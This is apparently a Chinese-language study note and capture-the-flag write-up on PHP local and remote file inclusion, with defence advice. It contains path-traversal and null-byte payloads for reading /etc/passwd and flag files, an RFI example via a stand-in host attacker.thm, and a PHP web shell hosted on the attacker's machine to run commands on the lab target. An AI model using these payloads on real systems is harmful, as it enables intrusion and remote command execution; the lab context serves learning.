# 文件包含


### 本地文件包含

php: file_get_contents、include、require、include_once、require_once

../ 穿越  返回上一级

后面不可控，%00或0x00 截断

注意：%00技巧是固定的，不适用于PHP 5.3.4及更高版本

. 一个点代表当前目录

/etc/passwd/.  等价于/etc/passwd   绕过

如果有../替换成空字符串可以尝试重写绕过  ....//....//....//....//etc/passwd
原理也很简单

如果前面的路径不可控，可以直接../穿越


### 远程文件包含

与LFI类似，挺简单

要求是allow_url_fopen\allow_url_include是开启的

下图是成功进行 RFI 攻击的步骤示例！假设攻击者在自己的服务器上托管一个PHP文件，http://attacker.thm/cmd.txt 其中cmd.txt包含打印消息Hello THM。

    <?PHP echo "Hello THM"; ?>

首先，攻击者注入恶意 URL，该 URL 指向攻击者的服务器，例如http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt。如果没有输入验证，则恶意 URL 将传递到 include 函数中。接下来，Web 应用服务器将向恶意服务器发送GET请求以获取文件。因此，Web 应用程序将远程文件包含在包含函数中，以在页面中执行 PHP 文件并将执行内容发送给攻击者。在我们的例子中，某处的当前页面必须显示Hello THM消息。


### 防御

作为开发人员，了解 Web 应用程序漏洞、如何查找它们以及预防方法非常重要。为了防止文件包含漏洞，一些常见的建议包括：

    使系统和服务（包括 Web 应用程序框架）保持最新版本的更新。

    关闭 PHP 错误以避免泄露应用程序的路径和其他可能泄露的信息。

    Web 应用程序防火墙 （WAF） 是帮助缓解 Web 应用程序攻击的不错选择。

    禁用某些会导致文件包含漏洞的 PHP 功能（如果 Web 应用不需要这些功能），例如打开和allow_url_include allow_url_fopen。

    仔细分析 Web 应用程序，只允许需要的协议和 PHP 包装器。

    永远不要信任用户输入，并确保针对文件包含实现正确的输入验证。

    实施文件名和位置的白名单以及黑名单。


## 挑战

#### Challenge 1

题目要求访问/etc/flag1

题目提示要用post请求

一开始先是用curl构造post请求  data:file=/etc/flag1

结果发现不行，没出结果，经过我无数遍尝试，结果发现题目提示是在post的请求   ......头中插入file字段。。。

最终成功拿到flag


#### Challenge 2

进入题目页面，提示：

    Welcome Guest!
    Only admins can access this page!

想都不用想，直接按下神奇的F12并按下神奇的F5，抓包看见请求头里面有cookie:

    Cookie: THM=Guest

果断改成admin，然后再构造get请求的file参数访问/etc/flag2，结果啥事没发生

我反复观看这个页面最终锁定了刚刚的：

    Welcome Guest!
    Only admins can access this page!

其中的：

    Only admins can access {this page!}

也就是说这并不是一段话，从一个文件读取到的，果断在Cookie的THM加入恶意符号，结果居然报错了

    Welcome [
    Warning: include(includes/[.php) [function.include]: .........

从此也能看出后缀被限定为了.php，我想我需要%00截断

构造cookie:

    THM="../../../../../../etc/flag2%00"

成功拿到flag

### Chellenge 3

利用到了上一章的身份认证绕过里面的知识点，不在阐述。


### 最终

题目要求远程执行hostname命令获取其内容

题目提示要使用RFI，首先在tryhackme的kali机中通过

    python3 -m http.server

开启http服务，然后再创建一个名为cmd.php文件，内容为：

    <?PHP
        echo system($_GET['cmd']);
    ?>

回到靶机，在题目表单中输入kali机的http://ip:port/cmd.php ，然后在靶机url上添加get参数&cmd=hostname

最终获得答案
